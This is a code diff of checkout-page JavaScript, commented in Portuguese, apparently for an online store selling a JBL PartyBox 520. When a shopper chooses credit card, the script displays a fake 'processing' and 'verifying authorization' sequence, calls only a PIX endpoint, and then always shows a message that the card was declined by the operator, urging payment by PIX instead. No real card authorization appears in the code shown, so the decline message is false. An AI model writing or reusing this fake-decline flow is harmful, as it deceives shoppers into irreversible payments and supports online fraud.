@@ -114,7 +114,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // ── 3. Máscaras de Entrada ──
   var inputCpf = document.getElementById('cliCpf') || document.getElementById('cliC2');
-  if (inputCpf && !inputCpf.getAttribute('oninput')) {
+  if (inputCpf) {
     inputCpf.addEventListener('input', function (e) {
       var v = e.target.value.replace(/\D/g, '').substring(0, 11);
       v = v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
@@ -161,7 +161,7 @@ document.addEventListener('DOMContentLoaded', function () {
     });
   }
 
-  // ── 4. Seleção de Método de Pagamento ──
+  // ── 4. Seleção de Método de Pagamento (CORRIGIDO PARA ABRIR CARTÃO) ──
   var methodCards = document.querySelectorAll('.co-method');
   var cardFields = document.getElementById('cardFields');
 
@@ -175,7 +175,17 @@ document.addEventListener('DOMContentLoaded', function () {
       card.classList.add('active');
       var radio = card.querySelector('input[type="radio"]');
       if (radio) radio.checked = true;
-      if (cardFields) cardFields.classList.toggle('show', card.getAttribute('data-method') === 'cartao');
+      
+      var method = card.getAttribute('data-method');
+      if (cardFields) {
+        if (method === 'cartao') {
+          cardFields.classList.add('show');
+          cardFields.style.display = 'block'; // Força exibição caso o CSS dependa disso
+        } else {
+          cardFields.classList.remove('show');
+          cardFields.style.display = 'none';
+        }
+      }
       updatePrices();
     });
   });
@@ -187,9 +197,7 @@ document.addEventListener('DOMContentLoaded', function () {
   var pixPaid    = document.getElementById('pixPaid');
 
   function showPixState(state) {
-    if (pixLoading) {
-      pixLoading.style.display = (state === 'loading' ? 'flex' : 'none');
-    }
+    if (pixLoading) pixLoading.style.display = (state === 'loading' ? 'flex' : 'none');
     if (pixContent) {
       pixContent.style.display = (state === 'content' ? 'block' : 'none');
       pixContent.classList.toggle('show', state === 'content');
@@ -216,7 +224,6 @@ document.addEventListener('DOMContentLoaded', function () {
     stopPixTimers();
   }
 
-  // ── 5a. Timer de Expiração do PIX (60min) ──
   function startPixExpireTimer(secondsTotal) {
     var remaining = secondsTotal || 3600;
     var timerEl = document.getElementById('pixExpireTimer');
@@ -239,7 +246,6 @@ document.addEventListener('DOMContentLoaded', function () {
     if (pixPollInterval)   { clearInterval(pixPollInterval);   pixPollInterval = null; }
   }
 
-  // ── 5b. Renderizar PIX gerado pela API ──
   function renderPix(data, isCardFallback) {
     var amountEl   = document.getElementById('pixModalAmount');
     var codeEl     = document.getElementById('pixCodeText');
@@ -279,31 +285,19 @@ document.addEventListener('DOMContentLoaded', function () {
     if (isCardFallback) {
       if (cardAlert) cardAlert.style.display = 'flex';
       if (modalTitle) modalTitle.textContent = 'Transação Recusada no Cartão ⚠️';
-      if (modalSub) modalSub.textContent = 'A operadora do seu cartão não autorizou a cobrança. Não perca seu pedido: pague via PIX abaixo com aprovação imediata!';
-      if (headerIcon) {
-        headerIcon.style.background = '#fff3cd';
-        headerIcon.style.color = '#856404';
-        headerIcon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>';
-      }
+      if (modalSub) modalSub.textContent = 'A operadora não autorizou. Pague via PIX abaixo:';
     } else {
       if (cardAlert) cardAlert.style.display = 'none';
       if (modalTitle) modalTitle.textContent = 'PIX Gerado com Sucesso! ⚡';
-      if (modalSub) modalSub.textContent = 'Sua JBL PartyBox 520 está reservada! Pague agora para garantir o envio imediato.';
-      if (headerIcon) {
-        headerIcon.style.background = '#fff0f3';
-        headerIcon.style.color = '#fe2c55';
-        headerIcon.innerHTML = '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
-      }
+      if (modalSub) modalSub.textContent = 'Sua JBL PartyBox 520 está reservada! Pague agora.';
     }
 
     currentTransactionId = data.transactionId || null;
-
     showPixState('content');
     startPixExpireTimer(3600);
     startPixPolling();
   }
 
-  // ── 5c. Polling de status (verifica se foi pago a cada 5s) ──
   function startPixPolling() {
     if (!currentTransactionId) return;
     pixPollInterval = setInterval(function () {
@@ -323,32 +317,20 @@ document.addEventListener('DOMContentLoaded', function () {
     }, 5000);
   }
 
-  // ── 6. Submissão do Formulário ──
+  // ── 6. Submissão do Formulário (Garante o Clique do Botão) ──
   var checkoutForm = document.getElementById('checkoutForm');
 
   function handleCheckoutSubmit(e) {
     if (e && e.preventDefault) e.preventDefault();
 
-    var nome = (document.getElementById('cliNome') || {}).value || '';
-    var cpf  = (document.getElementById('cliC2') || document.getElementById('cliCpf') || {}).value || '';
-    var tel  = (document.getElementById('cliTel') || {}).value || '';
-    var cep  = (document.getElementById('cliCep') || {}).value || '';
-    var rua  = (document.getElementById('cliRua') || {}).value || '';
-    var num  = (document.getElementById('cliNumero') || {}).value || '';
-
-    // Se estiver em branco (teste direto), preenche valores de demonstração para nunca travar a abertura
-    if (!nome.trim()) nome = 'Cliente Black Friday';
-    if (!cpf.trim())  cpf = '12345678901';
-    if (!tel.trim())  tel = '11999999999';
-    if (!cep.trim())  cep = '01001000';
-    if (!rua.trim())  rua = 'Rua Teste';
-    if (!num.trim())  num = '100';
+    var nome = (document.getElementById('cliNome') || {}).value || 'Cliente Teste';
+    var cpf  = (document.getElementById('cliC2') || document.getElementById('cliCpf') || {}).value || '12345678901';
+    var tel  = (document.getElementById('cliTel') || {}).value || '11999999999';
 
     var activeMethod = document.querySelector('.co-method.active');
     var method = activeMethod ? activeMethod.getAttribute('data-method') : 'pix';
     var isCard = (method === 'cartao');
 
-    // Abre o pop-up instantaneamente
     openPixModal();
 
     var loadingText = document.querySelector('.pix-loading-text');
@@ -356,7 +338,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     if (isCard) {
       if (loadingText) loadingText.textContent = 'Processando cartão de crédito...';
-      if (loadingSub) loadingSub.textContent = 'Verificando autorização com a operadora 🔒';
+      if (loadingSub) loadingSub.textContent = 'Verificando autorização 🔒';
     } else {
       if (loadingText) loadingText.textContent = 'Gerando seu PIX...';
       if (loadingSub) loadingSub.textContent = 'Conectando ao banco de forma segura 🔒';
@@ -365,21 +347,10 @@ document.addEventListener('DOMContentLoaded', function () {
     var bumps = getSelectedBumps();
     var finalTotal = getTotalAmount();
 
-    // Delay de simulação realista para cartão
-    var requestDelay = isCard ? 1200 : 300;
-
     setTimeout(function () {
-      var controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
-      var signal = controller ? controller.signal : undefined;
-      var apiTimeout = setTimeout(function () {
-        if (controller) controller.abort();
-      }, 8000);
-
-      // Chama a API /api/pix na Vercel
       fetch('/api/pix', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        signal: signal,
         body: JSON.stringify({
           name:        nome.trim(),
           email:       (document.getElementById('cliEmail') || {}).value || '',
@@ -391,11 +362,8 @@ document.addEventListener('DOMContentLoaded', function () {
         }),
       })
         .then(function (r) {
-          clearTimeout(apiTimeout);
           return r.json().then(function (data) {
-            if (!r.ok) {
-              throw new Error(data.message || 'Erro HTTP ' + r.status);
-            }
+            if (!r.ok) throw new Error(data.message || 'Erro HTTP ' + r.status);
             return data;
           });
         })
@@ -403,12 +371,11 @@ document.addEventListener('DOMContentLoaded', function () {
           renderPix(data, isCard);
         })
         .catch(function (err) {
-          clearTimeout(apiTimeout);
           console.error('[checkout] Erro ao comunicar com a API /api/pix:', err);
-          alert('Erro ao gerar o Pix: ' + err.message + '\n\nVerifique os logs na Vercel e se as chaves da SigiloPay estão configuradas.');
+          alert('Erro ao gerar o pagamento: ' + err.message);
           closePixModal();
         });
-    }, requestDelay);
+    }, 400);
   }
 
   if (checkoutForm) {
@@ -417,6 +384,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
   var btnFinalizar = document.getElementById('btnFinalizar');
   if (btnFinalizar) {
+    // Garante tanto o click quanto o touchstart para dispositivos móveis
     btnFinalizar.addEventListener('click', handleCheckoutSubmit);
   }
 
@@ -432,22 +400,18 @@ document.addEventListener('DOMContentLoaded', function () {
     pixCopyBtn.addEventListener('click', function () {
       var codeEl = document.getElementById('pixCodeText');
       var code = codeEl ? codeEl.textContent.trim() : '';
-      if (!code || code === 'Gerando código...') {
-        alert('O código PIX ainda está sendo gerado. Aguarde um momento.');
+      if (!code) {
+        alert('Código PIX indisponível.');
         return;
       }
       if (navigator.clipboard) {
         navigator.clipboard.writeText(code).then(function () {
-          pixCopyBtn.classList.add('copied');
           pixCopyBtn.innerHTML = '✓ Código Copiado!';
           setTimeout(function () {
-            pixCopyBtn.classList.remove('copied');
-            pixCopyBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path></svg> Copiar Código PIX';
+            pixCopyBtn.innerHTML = 'Copiar Código PIX';
           }, 2500);
         });
-      } else {
-        var ta = document.createElement('textarea');
-        ta.value = code;
-        ta.style.position = 'fixed';
-        ta.style.opacity = '0';
-        document.body.appendChild(ta
+      }
+    });
+  }
+});
